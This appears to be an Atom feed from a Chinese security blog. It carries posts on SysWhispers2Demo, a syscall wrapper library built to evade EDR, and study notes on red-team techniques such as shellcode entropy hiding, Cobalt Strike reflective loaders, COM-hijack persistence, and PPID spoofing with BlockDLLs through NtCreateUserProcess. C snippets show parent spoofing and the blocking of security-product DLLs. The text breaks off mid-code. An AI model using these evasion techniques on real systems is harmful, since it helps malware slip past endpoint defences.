<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HaCky的安全备忘录</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://findream.github.io/"/>
  <updated>2022-06-25T14:32:29.489Z</updated>
  <id>https://findream.github.io/</id>
  
  <author>
    <name>HaCky</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SysWhispers2Demo 简介</title>
    <link href="https://findream.github.io/2022/06/25/SysWhispers2Demo/"/>
    <id>https://findream.github.io/2022/06/25/SysWhispers2Demo/</id>
    <published>2022-06-25T06:02:11.000Z</published>
    <updated>2022-06-25T14:32:29.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-项目简介"><a href="#0x00-项目简介" class="headerlink" title="0x00 项目简介"></a>0x00 项目简介</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo是通过逆向分析kernel32.dll或者kernelbase.dll文件，从而仿写部分Win32 API的实现逻辑，以解决部分SysWhispers2使用者在利用SysWhispers2做EDR规避时候所遇到的开发困难。SysWhispers2Demo在仿写Win32 API的时候，<strong>部分采用最小开发原则</strong>，即部分参数需要使用微软API文档所约定的默认参数，以减轻仿写的工作量。项目地址:<a href="https://github.com/findream/SysWhispers2Demo" target="_blank" rel="external">https://github.com/findream/SysWhispers2Demo</a></p><a id="more"></a><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="external">SysWhispers2</a>主要是由jthuraisamy开发的通过Syscall用来规避EDR。SysWhispers2使用很方便，无需指定windows 操作系统版本，只需要通过syswhispers.py生成Nt*函数所需要的函数参数，调用约定等。但是，Ring3的逻辑需要自己实现，这就是SysWhispers2Demo的目的。</p><h2 id="0x01-文件描述"><a href="#0x01-文件描述" class="headerlink" title="0x01 文件描述"></a>0x01 文件描述</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo主要有3个文件<code>SysWhispers2Demo.cpp</code>,<code>SysWhispers2Demo.h</code>,<code>prototypes.h</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SysWhispers2Demo.cpp文件是Ring3层的实现逻辑。目前，主要实现了包括文件操作，注册表操作，进程操作，以及线程操作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文件操作，基本实现了文件的创建，读写，删除等操作，具体支持的Win32 API如下：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">CreateFileA</span></div><div class="line"><span class="attribute">CreateFileW</span></div><div class="line"><span class="attribute">ReadFile</span></div><div class="line"><span class="attribute">WriteFile</span></div><div class="line"><span class="attribute">NtQueryInformationFile</span></div><div class="line"><span class="attribute">NtSetInformationFile</span></div><div class="line"><span class="attribute">NtOpenFile</span></div><div class="line"><span class="attribute">NtQueryDirectoryFile</span></div><div class="line"><span class="attribute">DeleteFileA</span></div><div class="line"><span class="attribute">DeleteFileW</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注册表操作，也实现了注册表使用的常见API函数,支持两种ANSI和UNICODE字符。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">RegCreateKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegCreateKeyA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegSetValueExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegDeleteValueA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegQueryValueExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegOpenKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegOpenKeyA</span><span class="params">(W)</span></span></div><div class="line">RegCloseKey</div><div class="line"><span class="function"><span class="title">RegQueryInfoKeyA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegEnumKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegEnumKeyA</span><span class="params">(W)</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进程操作，也实现了常见的进程使用的API函数。<strong><em>因为CreateProcess内部实现的过于复杂，目前仅仅实现了能创建进程，但是创建进程之后，需要传出的参数，如ProcessInformation没有实现</em></strong><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">CreateProcessA</span><span class="params">(W)</span></span></div><div class="line">WinExec</div><div class="line">OpenProcess</div><div class="line">TerminateProcess</div><div class="line">ReadProcessMemory</div><div class="line">WriteProcessMemory</div><div class="line">GetExitCodeProcess</div><div class="line">GetLogicalProcessorInformation</div><div class="line">GetProcessAffinityMask</div><div class="line">IsWow64Process</div><div class="line">GetProcessId</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;线程操作，也实现了常见的线程使用的API函数。<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">CreateThread</span></div><div class="line"><span class="attribute">CreateRemoteThreadEx</span></div><div class="line"><span class="attribute">ResumeThread</span></div><div class="line"><span class="attribute">OpenThread</span></div><div class="line"><span class="attribute">GetThreadContext</span></div><div class="line"><span class="attribute">GetExitCodeThread</span></div><div class="line"><span class="attribute">GetProcessIdOfThread</span></div><div class="line"><span class="attribute">TerminateThread</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo.h是头文件，包含了SysWhispers2Demo.cpp的函数声明，和库所需要Nt*函数指针。前面typedef包含的是函数指针，后面是函数声明。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了增强开发的方便程度，SysWhispers2Demo采用的是和win32 API同样的函数原型，使用SysWhispers2Demo就像使用原生的Win32一模一样。仅仅需要在你所需要的Win32 API名称后面加一个Stub以示区别，例如，假如需要使用NtCreateFile创建文件，那么在Ring3需要调用CreateFileA，那只需要调用SysWhispers2Demo内置的CreateFileA_Stub。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prototypes.h包含的是一些所需要的变量类型等数据。这个是我删除了ntdll.h文件的函数声明。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面三个文件，在使用的时候，需要导入新项目。除此以外，还有两个文件，ntdll.h存储了一些函数声明和遍历类型，使用者可以在这里查看函数原型。而main.cpp我写的部分测试用例，是关于部分Win32 API的使用。<strong>这两个文件不需要导入项目。</strong></p><h2 id="0x02-使用步骤"><a href="#0x02-使用步骤" class="headerlink" title="0x02 使用步骤"></a>0x02 使用步骤</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo仅仅支持x64，x86在Syscall会遇到莫名其妙的问题，可以解决，但是不具有通用性，暂时不考虑支持x86。在win10 x64 vs2017编译通过。其他未测。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在你使用SysWhispers2生成了文件之后，假设生成了文件是<code>syscall.c</code>,<code>syscall.h</code>，以及<code>syscall.asm</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一步，在生成的syscall.h文件中，删除所有的变量定义。因为SysWhispers2会生成变量定义，而SysWhispers2Demo也带有变量定义，两者会冲突。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩，在生成的Syscall.h文件中，导入prototypes.h头文件。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三歩，在SysWhispers2Demo库文件SysWhioers2Demo.c文件中，导入syscall.h头文件，目的是修改链接的Nt函数。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四步，注释SysWhispers2Demo库文件SysWhioers2Demo.c文件中，指定函数的动态获取函数地址的语句。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此以外，也可以选择直接Copy SysWhispers2Demo.cpp中，你想要使用的函数。 No Care！这应该是最容易的。</p><h2 id="0x03-版本信息"><a href="#0x03-版本信息" class="headerlink" title="0x03 版本信息"></a>0x03 版本信息</h2><h3 id="v0-1-0（2022-06-20）"><a href="#v0-1-0（2022-06-20）" class="headerlink" title="v0.1.0（2022-06-20）"></a>v0.1.0（2022-06-20）</h3><ul><li>初始版本，支持常见的文件，注册表，进程，线程 API操作。</li></ul><h2 id="0x04-协议"><a href="#0x04-协议" class="headerlink" title="0x04 协议"></a>0x04 协议</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直接用就是了。</p><h2 id="0x05-FAQ"><a href="#0x05-FAQ" class="headerlink" title="0x05 FAQ"></a>0x05 FAQ</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;欢迎大家提PR</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果还有需要实现的kernel层API函数，或者bug，欢迎联系wanghacky@qq.com。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-项目简介&quot;&gt;&lt;a href=&quot;#0x00-项目简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 项目简介&quot;&gt;&lt;/a&gt;0x00 项目简介&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;SysWhispers2Demo是通过逆向分析kernel32.dll或者kernelbase.dll文件，从而仿写部分Win32 API的实现逻辑，以解决部分SysWhispers2使用者在利用SysWhispers2做EDR规避时候所遇到的开发困难。SysWhispers2Demo在仿写Win32 API的时候，&lt;strong&gt;部分采用最小开发原则&lt;/strong&gt;，即部分参数需要使用微软API文档所约定的默认参数，以减轻仿写的工作量。项目地址:&lt;a href=&quot;https://github.com/findream/SysWhispers2Demo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/findream/SysWhispers2Demo&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="windows 攻防" scheme="https://findream.github.io/categories/windows-%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.5.28-6.2）学习</title>
    <link href="https://findream.github.io/2022/06/14/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.5.28-6.2%EF%BC%89/"/>
    <id>https://findream.github.io/2022/06/14/绿盟科技-每周蓝军技术推送（2022.5.28-6.2）/</id>
    <published>2022-06-14T06:02:11.000Z</published>
    <updated>2022-06-14T13:09:49.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）"><a href="#0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）" class="headerlink" title="0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）"></a>0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）</h2><ul><li>原文链接：<a href="https://mp.weixin.qq.com/s/aZ3Af7xHOuqKGI_R89U0Fg" target="_blank" rel="external">每周蓝军技术推送（2022.5.28-6.2</a></li><li>这一周的内容推送主要是一些工具推荐</li><li>释放UDRL（用户定义反射加载器）内存的BOF</li><li>基于低熵的香农编码隐藏shellcode</li><li>Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放</li><li>C# 编写的 COM 劫持持久化辅助工具<a id="more"></a></li></ul><h2 id="0x01-调试和逆向ALPC"><a href="#0x01-调试和逆向ALPC" class="headerlink" title="0x01 调试和逆向ALPC"></a>0x01 调试和逆向ALPC</h2><ul><li>ALPC调试比较复杂没有仔细看。除了<a href="https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html" target="_blank" rel="external">这篇文章(调试和逆向ALPC)</a>之外，还有<a href="https://bbs.pediy.com/thread-268225.htm" target="_blank" rel="external">win10 1909逆向（ALPC通信原理浅析</a>等可以参考。</li></ul><h2 id="0x02-freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF"><a href="#0x02-freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF" class="headerlink" title="0x02 freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF"></a>0x02 freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF</h2><ul><li>这就是一个释放UDRL(用户定义反射加载器)的BOF。</li><li>BOF:即Beacon Object Files。是c编译后的文件，其有点就是小，可以在beacon内部使用，缺点就是会引发beacon崩溃。</li><li>关于BOF，可以看官方出的<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm" target="_blank" rel="external">文章</a></li></ul><h2 id="0x03-Shelltropy：基于低熵的香农编码隐藏shellcode"><a href="#0x03-Shelltropy：基于低熵的香农编码隐藏shellcode" class="headerlink" title="0x03 Shelltropy：基于低熵的香农编码隐藏shellcode"></a>0x03 Shelltropy：基于低熵的香农编码隐藏shellcode</h2><ul><li>一个概念：信息熵/香农熵：一组信息中随机性的量度，信息越随机，熵越高。</li><li>一个重要结论：bin通过加密混淆或者加壳，会导致信息熵增加。多数恶意软件，信息熵偏高。</li><li>如何降低熵，规避EDR：之前了解过，将加密数据嵌入正常的可执行文件可以避免高熵。</li><li>Shelltropy作者所写的<a href="https://kleiton0x00.github.io/posts/The-more-predictable-you-are-the-less-you-are-able-to-get-detected/" target="_blank" rel="external">文章</a>的思路是通过向高熵的数据中插入低熵的数据，可以将整体的熵降低。但是这么做会使shellcode增大一倍。<br> <img src="http://hacky.wang/blog/20220613/Lk1z89W0zf5w.png?imageslim" alt="mark"></li><li>Ref：<a href="https://github.com/kleiton0x00/Shelltropy/blob/main/README.md" target="_blank" rel="external">https://github.com/kleiton0x00/Shelltropy/blob/main/README.md</a></li></ul><h2 id="0x04-KaynStrike：Cobalt-Strike-Beacon-的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放"><a href="#0x04-KaynStrike：Cobalt-Strike-Beacon-的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放" class="headerlink" title="0x04 KaynStrike：Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放"></a>0x04 KaynStrike：Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放</h2><ul><li><a href="https://github.com/Cracked5pider/KaynStrike" target="_blank" rel="external">KaynStrike</a>设计确实很巧妙，首先，工具分段把PE数据写入当前进程空间，然后拉起一个线程，并将EIP设置成之前那段数据的入口点，Resume之后，便执行了beacon代码，之后，主线程这边采用同样的方法执行NtFreeVirtualMemoryAPI函数，进行free。</li></ul><h2 id="0x05-COM-Hunter：C-编写的-COM-劫持持久化辅助工具"><a href="#0x05-COM-Hunter：C-编写的-COM-劫持持久化辅助工具" class="headerlink" title="0x05 COM-Hunter：C# 编写的 COM 劫持持久化辅助工具"></a>0x05 COM-Hunter：C# 编写的 COM 劫持持久化辅助工具</h2><ul><li><a href="https://github.com/nickvourd/COM-Hunter" target="_blank" rel="external">https://github.com/nickvourd/COM-Hunter</a>阅读了该工具的部分源码，其[内置]了一些可以被COM劫持的CLSID列表，没什么可说的。关于如何狩猎可以被COM劫持的CLSID可以参考<a href="https://www.4hou.com/posts/Mo51" target="_blank" rel="external">持久性COM劫持的实现 - 嘶吼</a>等文章，除此以外<a href="https://github.com/findream/SecStudy/blob/main/ATT-CK/Remote-ComHiJack/ReadMe.md" target="_blank" rel="external">我的github</a>上有一个可以远程狩猎COM劫持的工具。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）&quot;&gt;&lt;a href=&quot;#0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）&quot; class=&quot;headerlink&quot; title=&quot;0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）&quot;&gt;&lt;/a&gt;0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://mp.weixin.qq.com/s/aZ3Af7xHOuqKGI_R89U0Fg&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;每周蓝军技术推送（2022.5.28-6.2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;这一周的内容推送主要是一些工具推荐&lt;/li&gt;
&lt;li&gt;释放UDRL（用户定义反射加载器）内存的BOF&lt;/li&gt;
&lt;li&gt;基于低熵的香农编码隐藏shellcode&lt;/li&gt;
&lt;li&gt;Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放&lt;/li&gt;
&lt;li&gt;C# 编写的 COM 劫持持久化辅助工具
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.5.14-5.20）学习</title>
    <link href="https://findream.github.io/2022/05/29/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81(2022.5.14-5.20)/"/>
    <id>https://findream.github.io/2022/05/29/绿盟科技-每周蓝军技术推送(2022.5.14-5.20)/</id>
    <published>2022-05-29T06:02:11.000Z</published>
    <updated>2022-06-14T13:10:09.303Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-每周蓝军技术推送（2022-5-14-5-20）"><a href="#0x00-每周蓝军技术推送（2022-5-14-5-20）" class="headerlink" title="0x00 每周蓝军技术推送（2022.5.14-5.20）"></a>0x00 每周蓝军技术推送（2022.5.14-5.20）</h2><ul><li>这一周的推送，主要学习了三部分内容：</li><li>篡改注册表与ETW，隐匿执行计划任务</li><li>使用NtCreateUserProcess进行PPID欺骗 和BlockDLL</li><li>Windows环境下的自保护探究<a id="more"></a></li></ul><h2 id="0x01-PPID-Spoofing-amp-BlockDLLs-with-NtCreateUserProcess"><a href="#0x01-PPID-Spoofing-amp-BlockDLLs-with-NtCreateUserProcess" class="headerlink" title="0x01 PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess"></a>0x01 PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess</h2><ul><li><p>在<a href="https://offensivedefence.co.uk/posts/ntcreateuserprocess/" target="_blank" rel="external">这篇文章中</a>，作者介绍了如何使用<code>NtCreateUserProcess</code>这一个未被官方文档化的API函数，NtCreateUserProcess函数是CreateProcessA(W)的底层实现。可以规避部分EDR的检测。</p></li><li><p>作者的灵感来源是来自Capt. Meelo的<a href="https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html" target="_blank" rel="external">Making NtCreateUserProcess Work</a>一文，NtCreateUserProcess的函数原型如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">NTSTATUS</div><div class="line">NTAPI</div><div class="line">NtCreateUserProcess(</div><div class="line">    <span class="variable">_Out_</span> PHANDLE ProcessHandle,</div><div class="line">    <span class="variable">_Out_</span> PHANDLE ThreadHandle,</div><div class="line">    <span class="variable">_In_</span> ACCESS_MASK ProcessDesiredAccess,</div><div class="line">    <span class="variable">_In_</span> ACCESS_MASK ThreadDesiredAccess,</div><div class="line">    <span class="variable">_In_opt_</span> POBJECT_ATTRIBUTES ProcessObjectAttributes,</div><div class="line">    <span class="variable">_In_opt_</span> POBJECT_ATTRIBUTES ThreadObjectAttributes,</div><div class="line">    <span class="variable">_In_</span> ULONG ProcessFlags,</div><div class="line">    <span class="variable">_In_</span> ULONG ThreadFlags,</div><div class="line">    <span class="variable">_In_</span> PRTL_USER_PROCESS_PARAMETERS ProcessParameters,</div><div class="line">    <span class="variable">_Inout_</span> PPS_CREATE_INFO CreateInfo,</div><div class="line">    <span class="variable">_In_</span> PPS_ATTRIBUTE_LIST AttributeList</div><div class="line">);</div></pre></td></tr></table></figure></li><li><p><code>ProcessHandle</code>和<code>ThreadHandle</code>分别是需要传出的进程和线程句柄，可以为NULL。</p></li></ul><ul><li><p><code>ProcessDesiredAccess</code>和<code>ThreadDesiredAccess</code>是进程和线程访问权限掩码。可以直接为PROCESS_ALL_ACCESS和THREAD_ALL_ACCESS，具体可以参见以下文档,</p><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights" target="_blank" rel="external">进程安全和访问权限</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights" target="_blank" rel="external">线程安全和访问权限</a></li></ul></li><li><p><code>ProcessObjectAttributes</code>和<code>ThreadObjectAttributes</code>是进程和线程对象属性，指向OBJECT_ATTRIBUTES结构，此处可以为<code>NULL</code></p></li><li><p><code>ProcessFlags</code>和<code>ThreadFlags</code>是进程线程标志，Meelo是查看ProcessHack源码获得的，此处可以为NULL</p></li><li><p><code>ProcessParameters</code>是进程参数信息，指向的是<code>RTL_USER_PROCESS_PARAMETERS</code>结构，通过逆向CreateProcessA函数，可以发现使用<code>RtlCreateProcessParametersEx</code>进行初始化</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">UNICODE_STRING</span> <span class="string">NtImagePath;</span></div><div class="line"><span class="string">RtlInitUnicodeString(&amp;NtImagePath,</span> <span class="string">(PWSTR)L"\\??\\C:\\Windows\\System32\\mmc.exe");</span></div><div class="line"><span class="string">PRTL_USER_PROCESS_PARAMETERS</span> <span class="string">ProcessParameters</span> <span class="string">=</span> <span class="literal">NULL</span><span class="string">;</span></div><div class="line"><span class="string">RtlCreateProcessParametersEx(&amp;ProcessParameters,</span> <span class="string">&amp;NtImagePath,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">RTL_USER_PROCESS_PARAMETERS_NORMALIZED);</span></div></pre></td></tr></table></figure></li><li><p>CreateInfo是一个指向<code>PS_CREATE_INFO</code>结构的指针，对于PS_CREATE_INFO结构的初始化也很简单。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// process create info</span></div><div class="line">PS_CREATE_INFO CreateInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">CreateInfo.Size = sizeof(CreateInfo);</div><div class="line">CreateInfo.State = PsCreateInitialState;</div></pre></td></tr></table></figure></li><li><p>最后一个参数是<code>AttributeList</code>，AttributeList指向的是PPS_ATTRIBUTE_LIST结构体，这是一个链表结构，可以通过RtlAllocateHeap函数自主申请链表的大小。在第一个节点中,必须要添加PS_ATTRIBUTE_IMAGE_NAME（进程映像名）这个属性。</p><figure class="highlight thrift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PS_ATTRIBUTE_LIST</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">SIZE_T TotalLength;                 <span class="comment">// sizeof(PS_ATTRIBUTE_LIST)</span></div><div class="line">PS_ATTRIBUTE Attributes[<span class="number">2</span>];         <span class="comment">// Depends on how many attribute entries should be supplied to NtCreateUserProcess</span></div><div class="line">&#125; PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;</div></pre></td></tr></table></figure></li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// initialise attribute list</span></div><div class="line">PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE) * <span class="number">3</span>);</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>TotalLength = sizeof(PS_ATTRIBUTE_LIST);</div><div class="line"><span class="comment">// set image name</span></div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">0</span>].Attribute = PS_ATTRIBUTE_IMAGE_NAME;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">0</span>].Size = NtImagePath.Length;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">0</span>].Value = (ULONG_PTR)NtImagePath.Buffer;</div></pre></td></tr></table></figure><ul><li><p>作者在这篇文章中主要实现了两个功能，一个是PPID Spoofing，也就是父进程欺骗，另外一个是BlockDLLs，BlockDLLs简单的来说就是阻止一些非可信的DLL模块加载到进程中。</p></li><li><p>进程隐藏可以通过设置进程的Attribute即可，具体操作如下,将进程的PS_ATTRIBUTE_PARENT_PROCESS(父进程)属性设置为指定的父进程的Handle即可。：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// add parent process attribute</span></div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">1</span>].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">1</span>].Size = sizeof(HANDLE);</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">1</span>].ValuePtr = hParent;</div></pre></td></tr></table></figure></li><li><p>BlockDLLs允许系统根据不同的策略加载不同安全等级的Dll文件，因为一些安全软件会通过往进程中加载dll来进行行为监控，利用这个特性就可以阻止非windows的dll加载，包括安全软件的dll。<a href="https://paper.seebug.org/929/" target="_blank" rel="external">这里</a>可以看到完整的BlockDlls的介绍,主要有两种方法。</p><ul><li><p>通过<code>SetProcessMitigationPolicy</code>函数设置阻止策略。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY policy;</div><div class="line">policy.MitigationOptIn = 1;</div><div class="line">SetProcessMitigationPolicy(ProcessSignaturePolicy, &amp;policy, sizeof(policy))</div></pre></td></tr></table></figure></li><li><p>通过UpdateProcThreadAttribute修改线程属性。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DWORD64 ProtectionLevel = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON<span class="comment">; //policy.MitigationOptIn</span></div><div class="line">UpdateProcThreadAttribute(<span class="name">si</span>.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, <span class="symbol">&amp;ProtectionLevel</span>, sizeof(<span class="name">ProtectionLevel</span>), NULL, NULL)</div></pre></td></tr></table></figure></li></ul></li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div 